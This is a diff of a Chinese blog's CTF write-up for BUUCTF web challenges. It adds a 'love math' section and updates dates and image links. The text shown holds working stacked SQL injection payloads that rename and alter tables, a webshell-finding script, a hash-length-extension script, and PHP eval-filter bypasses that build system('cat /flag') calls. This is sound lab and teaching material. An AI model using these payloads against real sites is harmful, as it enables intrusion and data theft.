@@ -274,12 +274,12 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">3k</span>Reading time: <span class="post-count reading-time">13 min</span></span>
+                        <span>Word count: <span class="post-count word-count">3.8k</span>Reading time: <span class="post-count reading-time">17 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/09/03</span>
+                    <span class="post-intro-time">2019/10/20</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -404,7 +404,8 @@ height:50vh;
             <main class="main post-page">
     <article class="article-entry">
         <blockquote>
-<p>林中有鹿，鹿有孤独。孤独无尽，尽在林中。</p>
+<p>知乎上有个问题：“如何忘记一个人？”</p>
+<p>有个人回答：“两千多个答案，没一个有用。”</p>
 </blockquote>
 <hr>
 <a id="more"></a>
@@ -414,7 +415,7 @@ height:50vh;
 <h4 id="解法一：堆叠注入"><a href="#解法一：堆叠注入" class="headerlink" title="解法一：堆叠注入"></a>解法一：堆叠注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=233&apos;;show tables;#</span><br></pre></td></tr></table></figure>
 
 <p>可以看到有两个表~</p>
-<p><img src="/2019/09/03/BUUCTF-WEB/1567737495728.png" alt="1567737495728"></p>
+<p><img src="/2019/10/20/BUUCTF-WEB/1567737495728.png" alt="1567737495728"></p>
 <blockquote>
 <p>先介绍一下prepare语法：<br>PREPARE test from ‘我们的sql语句’;//预定义好sql<br>EXECUTE test (如果sql有参数的话, USING xxx,xxx); // (这里USING的只能是会话变量)执行预定义的sql<br>DEALLOCATE PREPARE test;//释放数据库连接</p>
 </blockquote>
@@ -442,9 +443,9 @@ height:50vh;
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?inject=233';<span class="keyword">sEt</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'se'</span>,<span class="string">'lect * from `1919810931114514`'</span>);</span><br><span class="line"><span class="keyword">prEpare</span> pay <span class="keyword">from</span> @<span class="keyword">sql</span>;</span><br><span class="line"><span class="keyword">execute</span> pay;</span><br></pre></td></tr></table></figure>
 
 <p>然后就能看到flag~</p>
-<p><img src="/2019/09/03/BUUCTF-WEB/1567736159943.png" alt="1567736159943"></p>
+<p><img src="/2019/10/20/BUUCTF-WEB/1567736159943.png" alt="1567736159943"></p>
 <p>此外，还能采用hex编码的形式，在python2中~</p>
-<p><img src="/2019/09/03/BUUCTF-WEB/1567736240567.png" alt="1567736240567"></p>
+<p><img src="/2019/10/20/BUUCTF-WEB/1567736240567.png" alt="1567736240567"></p>
 <p>利用其构造的payload为：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?inject=233';<span class="keyword">sEt</span> @<span class="keyword">sql</span>=<span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;</span><br><span class="line"><span class="keyword">prEpare</span> pay <span class="keyword">from</span> @<span class="keyword">sql</span>;</span><br><span class="line"><span class="keyword">execute</span> pay;</span><br></pre></td></tr></table></figure>
 
@@ -454,19 +455,19 @@ height:50vh;
 </blockquote>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=<span class="number">233</span><span class="string">';show columns from `1919810931114514`;#</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/09/03/BUUCTF-WEB/1567736840935.png" alt="1567736840935"></p>
+<p><img src="/2019/10/20/BUUCTF-WEB/1567736840935.png" alt="1567736840935"></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=<span class="number">233</span><span class="string">';show columns from words;#</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/09/03/BUUCTF-WEB/1567736893848.png" alt="1567736893848"></p>
+<p><img src="/2019/10/20/BUUCTF-WEB/1567736893848.png" alt="1567736893848"></p>
 <p>接下来不太懂，咋就看粗来words表是默认查询的表了鸭…</p>
 <p>把191那个表改名为words，把flag列改为id列：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/?inject=<span class="number">233</span><span class="string">';RENAME TABLE `words` TO `words1`;</span></span><br><span class="line"><span class="string">RENAME TABLE `1919810931114514` TO `words`;</span></span><br><span class="line"><span class="string">ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;</span></span><br><span class="line"><span class="string">show columns from words;#</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/09/03/BUUCTF-WEB/1567738654654.png" alt="1567738654654"></p>
+<p><img src="/2019/10/20/BUUCTF-WEB/1567738654654.png" alt="1567738654654"></p>
 <p>再访问：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=<span class="number">233</span><span class="string">' or '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/09/03/BUUCTF-WEB/1567738677680.png" alt="1567738677680"></p>
+<p><img src="/2019/10/20/BUUCTF-WEB/1567738677680.png" alt="1567738677680"></p>
 <p>太神奇了叭…</p>
 <hr>
 <h3 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h3><blockquote>
@@ -487,7 +488,7 @@ height:50vh;
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s)</span>:</span></span><br><span class="line">	md5 = hashlib.md5() </span><br><span class="line">	md5.update(s) </span><br><span class="line">	<span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sol</span><span class="params">()</span>:</span> </span><br><span class="line"> 	filename = <span class="string">'/fllllllllllllag'</span></span><br><span class="line"> 	a =<span class="string">"da53eb64-a805-4d4e-bdc2-fda1e66c587e"</span></span><br><span class="line">	print(md5(a+md5(filename)))</span><br><span class="line"></span><br><span class="line">sol()</span><br></pre></td></tr></table></figure>
 
 <p>跑出来的hash值为 - -</p>
-<p><img src="/2019/09/03/BUUCTF-WEB/1567757429756.png" alt="1567757429756"></p>
+<p><img src="/2019/10/20/BUUCTF-WEB/1567757429756.png" alt="1567757429756"></p>
 <p>利用其访问就行了鸭~</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file?filename=/fllllllllllllag&amp;filehash=75b7a43f3540e10cd317045514812aba</span><br></pre></td></tr></table></figure>
 
@@ -499,25 +500,25 @@ height:50vh;
 <p>参考wp：<a href="https://mochazz.github.io/2019/05/27/2019强网杯Web部分题解/#高明的黑客" target="_blank" rel="noopener">https://mochazz.github.io/2019/05/27/2019强网杯Web部分题解/#高明的黑客</a></p>
 </blockquote>
 <p>这道题有点猛…</p>
-<p><img src="/2019/09/03/BUUCTF-WEB/1567768512837.png" alt="1567768512837"></p>
+<p><img src="/2019/10/20/BUUCTF-WEB/1567768512837.png" alt="1567768512837"></p>
 <p>根据提示下载源码，给了一大堆混乱的文件，需要从这些文件中找能用的shell…</p>
 <p>写脚本批量扫描一下类似<code>eval($_GET[x])</code>或<code>system($_GET[x])</code>等shell。</p>
 <p>先进入该文件目录，使用PHP7.0以上版本开个端口，作为本地服务器：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php7.3 -S 0.0.0.0:8888</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/09/03/BUUCTF-WEB/1567769481174.png" alt="1567769481174"></p>
+<p><img src="/2019/10/20/BUUCTF-WEB/1567769481174.png" alt="1567769481174"></p>
 <blockquote>
 <p>话说这里，<br>-S 127.0.0.0:8000可以正常访问，<br>-S localhost:8000就不能访问，<br>什么鬼…</p>
 </blockquote>
 <p>访问localhost:8888，能够看到页面显示正常，就开始跑脚本 - -</p>
-<p><img src="/2019/09/03/BUUCTF-WEB/1567769555902.png" alt="1567769555902"></p>
+<p><img src="/2019/10/20/BUUCTF-WEB/1567769555902.png" alt="1567769555902"></p>
 <p>直接借用了这个nb师傅的脚本（tqltqltql~）：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">filenames = os.listdir(<span class="string">'/var/www/html/src'</span>)</span><br><span class="line">pattern = re.compile(<span class="string">r"\$_[GEPOST]&#123;3,4&#125;\[.*\]"</span>)</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> filenames:</span><br><span class="line">    print(name)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'/var/www/html/src/'</span>+name,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    result = list(set(pattern.findall(data)))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> ret <span class="keyword">in</span> result:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        command = <span class="string">'uname'</span></span><br><span class="line">        flag = <span class="string">'Linux'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'GET'</span> <span class="keyword">in</span> ret:</span><br><span class="line">            passwd = re.findall(<span class="string">r"'(.*)'"</span>,ret)[<span class="number">0</span>]</span><br><span class="line">            r = requests.get(url=<span class="string">'http://127.0.0.1:8888/'</span> + name + <span class="string">'?'</span> + passwd + <span class="string">'='</span>+ command)</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                print(<span class="string">'backdoor file is: '</span> + name)</span><br><span class="line">                print(<span class="string">'GET:  '</span> + passwd)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">'POST'</span> <span class="keyword">in</span> ret:</span><br><span class="line">            passwd = re.findall(<span class="string">r"'(.*)'"</span>,ret)[<span class="number">0</span>]</span><br><span class="line">            r = requests.post(url=<span class="string">'http://127.0.0.1:8888/'</span> + name,data=&#123;passwd:command&#125;)</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                print(<span class="string">'backdoor file is: '</span> + name)</span><br><span class="line">                print(<span class="string">'POST:  '</span> + passwd)</span><br><span class="line">    <span class="keyword">except</span> : <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
 
 <p>确实跑了很久，大概在中间位置能看到成功的shell - -</p>
-<p><img src="/2019/09/03/BUUCTF-WEB/1567769831998.png" alt="1567769831998"></p>
+<p><img src="/2019/10/20/BUUCTF-WEB/1567769831998.png" alt="1567769831998"></p>
 <p>然后利用这个shell，去cat flag叭~</p>
-<p><img src="/2019/09/03/BUUCTF-WEB/1567769890029.png" alt="1567769890029"></p>
+<p><img src="/2019/10/20/BUUCTF-WEB/1567769890029.png" alt="1567769890029"></p>
 <hr>
 <h3 id="Hack-World"><a href="#Hack-World" class="headerlink" title="Hack World"></a>Hack World</h3><blockquote>
 <p>CISCN2019 华北赛区</p>
@@ -525,7 +526,7 @@ height:50vh;
 <blockquote>
 <p>参考wp：<br><a href="http://www.n0puple.com/index.php/archives/53/#cl-6" target="_blank" rel="noopener">http://www.n0puple.com/index.php/archives/53/#cl-6</a><br><a href="https://southseast.cc/2019/07/19/2019-CISCN-Northern/" target="_blank" rel="noopener">https://southseast.cc/2019/07/19/2019-CISCN-Northern/</a></p>
 </blockquote>
-<p><img src="/2019/09/03/BUUCTF-WEB/1567938005681.png" alt="1567938005681"></p>
+<p><img src="/2019/10/20/BUUCTF-WEB/1567938005681.png" alt="1567938005681"></p>
 <p>POST方式提交id值，随便尝试一下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">id=1</span><br><span class="line">Hello, glzjin wants a girlfriend.</span><br><span class="line"></span><br><span class="line">id=2</span><br><span class="line">Do you want to be my girlfriend?</span><br><span class="line"></span><br><span class="line">id=0 or id=3++</span><br><span class="line">Error Occured When Fetch Result.</span><br><span class="line"></span><br><span class="line">id=1&apos;</span><br><span class="line">bool(false)</span><br><span class="line"></span><br><span class="line">id=1&apos; (此处有个空格)</span><br><span class="line">SQL Injection Checked.</span><br></pre></td></tr></table></figure>
 
@@ -619,28 +620,80 @@ height:50vh;
 
 <blockquote>
 <p>复现环境下的flag实在是太真实了叭…</p>
-<p><img src="/2019/09/03/BUUCTF-WEB/20190908201424.png" alt="20190908201424"></p>
+<p><img src="/2019/10/20/BUUCTF-WEB/20190908201424.png" alt="20190908201424"></p>
 </blockquote>
 <hr>
 <h4 id="解法二（预期解）：哈希长度扩展攻击"><a href="#解法二（预期解）：哈希长度扩展攻击" class="headerlink" title="解法二（预期解）：哈希长度扩展攻击"></a>解法二（预期解）：哈希长度扩展攻击</h4><p>原理官方文档都有，就不赘述了。可以利用hashpump - -</p>
-<p><img src="/2019/09/03/BUUCTF-WEB/20190908201008.png" alt="20190908201008"></p>
+<p><img src="/2019/10/20/BUUCTF-WEB/20190908201008.png" alt="20190908201008"></p>
 <p>然后在请求头中添加Cookie值 - -</p>
-<p><img src="/2019/09/03/BUUCTF-WEB/20190908200909.png" alt="20190908200909"></p>
+<p><img src="/2019/10/20/BUUCTF-WEB/20190908200909.png" alt="20190908200909"></p>
 <p>也可以直接上脚本，这里直接搬<a href="https://www.zhaoj.in/read-6170.html" target="_blank" rel="noopener">赵师傅</a>的了☺(python2)：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">url = <span class="string">'flag.txt'</span></span><br><span class="line"><span class="comment"># url = 'local-file:/etc/passwd'</span></span><br><span class="line">r = requests.get(<span class="string">'http://127.0.0.1:8083/geneSign'</span>, params=&#123;<span class="string">'param'</span>: url&#125;)</span><br><span class="line">sign = r.text</span><br><span class="line">hash_sign = hashpumpy.hashpump(sign, url + <span class="string">'scan'</span>, <span class="string">'read'</span>, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">'http://127.0.0.1:8083/De1ta'</span>, params=&#123;<span class="string">'param'</span>: url&#125;, cookies=&#123;</span><br><span class="line">    <span class="string">'sign'</span>: hash_sign[<span class="number">0</span>],</span><br><span class="line">    <span class="string">'action'</span>: urllib.quote(hash_sign[<span class="number">1</span>][len(url):])</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
 
-<hr>
-<center><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="386" height="86" src="//music.163.com/outchain/player?type=2&id=539420&auto=1&height=66"></iframe>
+<h3 id="love-math"><a href="#love-math" class="headerlink" title="love math"></a>love math</h3><p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<p><code>c</code>的长度需要小于80，过滤了空格、制表符、换行、单引号、双引号、反引号、左右方括号。输入的字符串只能是<code>$whitelist</code>中的函数。要想办法从函数返回结果中获取任意字符串。</p>
+<p><code>base_convert</code>函数可以返回任意字符，但它无法返回特殊字符：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">echo</span> base_convert(<span class="string">'phpinfo()'</span>,<span class="number">36</span>,<span class="number">10</span>)</span><br><span class="line">php &gt; ;</span><br><span class="line"><span class="number">55490343972</span></span><br><span class="line">php &gt; <span class="keyword">echo</span> base_convert(<span class="number">55490343972</span>,<span class="number">10</span>,<span class="number">36</span>);</span><br><span class="line">phpinfo</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>老是忘记打分号…</p>
+</blockquote>
+<p>那就先尝试一下<code>c=base_convert(55490343972,10,36)()</code></p>
+<p>能够成功执行，再试一下system(‘ls’)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=base_convert(<span class="number">1751504350</span>,<span class="number">10</span>,<span class="number">36</span>)(base_convert(<span class="number">784</span>,<span class="number">10</span>,<span class="number">36</span>))</span><br></pre></td></tr></table></figure>
+
+<p>可以看到返回了index.php，但是并没有flag.php。看一下根目录：（复现的环境下，flag的位置是<code>/flag</code>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">($pi=base_convert)(<span class="number">1751504350</span>,<span class="number">10</span>,<span class="number">36</span>)($pi(<span class="number">1438255411</span>,<span class="number">14</span>,<span class="number">34</span>)(dechex(<span class="number">1819484207</span>)))</span><br><span class="line"></span><br><span class="line">system(<span class="string">'ls /'</span>)</span><br><span class="line"></span><br><span class="line">bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr <span class="keyword">var</span> <span class="keyword">var</span></span><br></pre></td></tr></table></figure>
+
+<p>找到了flag的位置，现在尝试读取其中的内容。</p>
+<p>方法一是利用php函数<code>readfile()</code>读取文件</p>
+<blockquote>
+<p>原题是flag.php文件，所以需要异或出<code>.</code>，这里的话就可以省掉了。</p>
+</blockquote>
+<p>为了尽可能减小payload长度，可以给base_convert取一个别名，在白名单里面，最短的就是<code>pi</code>了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">($pi=base_convert)(<span class="number">2146934604002</span>,<span class="number">10</span>,<span class="number">36</span>)($pi(<span class="number">1438255411</span>,<span class="number">14</span>,<span class="number">34</span>)(dechex(<span class="number">203581841767</span>)))</span><br><span class="line"></span><br><span class="line">readfile(/flag)</span><br></pre></td></tr></table></figure>
+
+<p>但是这个payload长度超了。</p>
+<p>方法二是利用系统命令执行读取文件的命令。</p>
+<p>这里可以使用白名单中的函数<code>dechex()</code>，括号中写命令的十进制格式，而这个函数能将其转换成命令的十六进制格式，然后再利用base_convert构造出<code>hex2bin</code>函数将其转换回命令的ASCII字符。</p>
+<p>所以可以构造payload为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">($pi=base_convert)(<span class="number">1751504350</span>,<span class="number">10</span>,<span class="number">36</span>)($pi(<span class="number">1438255411</span>,<span class="number">14</span>,<span class="number">34</span>)(dechex(<span class="number">109270211243818</span>)))</span><br><span class="line"></span><br><span class="line">system(hex2bin(dechex(<span class="number">109270211243818</span>))) -&gt; system(<span class="string">'cat /*'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>但是长度还是超了。</p>
+<p>换成exec命令试试。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">($pi=base_convert)(<span class="number">22950</span>,<span class="number">23</span>,<span class="number">34</span>)($pi(<span class="number">1438255411</span>,<span class="number">14</span>,<span class="number">34</span>)(dechex(<span class="number">109270211243818</span>)))</span><br><span class="line">exec(<span class="string">'cat /*'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>嗯可以成功getflag。</p>
+<p>此外，<code>nl</code>命令也可以读取文件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">($pi=base_convert)(<span class="number">22950</span>,<span class="number">23</span>,<span class="number">34</span>)($pi(<span class="number">1438255411</span>,<span class="number">14</span>,<span class="number">34</span>)(dechex(<span class="number">474260451114</span>)))</span><br><span class="line">($pi=base_convert)(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)($pi(<span class="number">1438255411</span>,<span class="number">14</span>,<span class="number">34</span>)(dechex(<span class="number">474260451114</span>)))</span><br><span class="line">exec(nl <span class="comment">/*)</span></span><br></pre></td></tr></table></figure>
+
+<p>方法三是异或出<code>_GET</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">n^1=_ v^1=G t^1=E e^1=T</span><br><span class="line">&apos;nvte&apos;^&apos;1111&apos;-&gt;_GET</span><br></pre></td></tr></table></figure>
+
+<p>所以构造出：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi=base_convert;$pi=$pi(1114322,10,36)^$pi(47989,10,36);$&#123;$pi&#125;&#123;0&#125;($&#123;$pi&#125;&#123;1&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>payload就是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>=system&amp;<span class="number">1</span>=cat /flag&amp;c=$pi=base_convert;$pi=$pi(<span class="number">1114322</span>,<span class="number">10</span>,<span class="number">36</span>)^$pi(<span class="number">47989</span>,<span class="number">10</span>,<span class="number">36</span>);$&#123;$pi&#125;&#123;<span class="number">0</span>&#125;($&#123;$pi&#125;&#123;<span class="number">1</span>&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>OK</p>
+<hr>
+<blockquote>
+<p>在人海相遇的人，迟早要归还人海。</p>
+</blockquote>
+<hr>
+<center><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=477913&auto=1&height=66"></iframe>
 </center>
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>Author：<a href="http://laure1.github.io">Laurel</a>
-            <p>原文链接：<a href="https://laure1.github.io/2019/09/03/BUUCTF-WEB/">https://laure1.github.io/2019/09/03/BUUCTF-WEB/</a>
-            <p>发表日期：<a href="https://laure1.github.io/2019/09/03/BUUCTF-WEB/">September 3rd 2019, 11:12:42 pm</a>
-            <p>更新日期：<a href="https://laure1.github.io/2019/09/03/BUUCTF-WEB/">September 25th 2019, 5:38:18 am</a>
+            <p>原文链接：<a href="https://laure1.github.io/2019/10/20/BUUCTF-WEB/">https://laure1.github.io/2019/10/20/BUUCTF-WEB/</a>
+            <p>发表日期：<a href="https://laure1.github.io/2019/10/20/BUUCTF-WEB/">October 20th 2019, 11:11:11 am</a>
+            <p>更新日期：<a href="https://laure1.github.io/2019/10/20/BUUCTF-WEB/">October 20th 2019, 10:02:51 am</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -648,17 +701,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2019/09/06/Java-遥控风扇/" title= "Java Remote Control Fan">
-                    <div class="nextTitle">Java Remote Control Fan</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
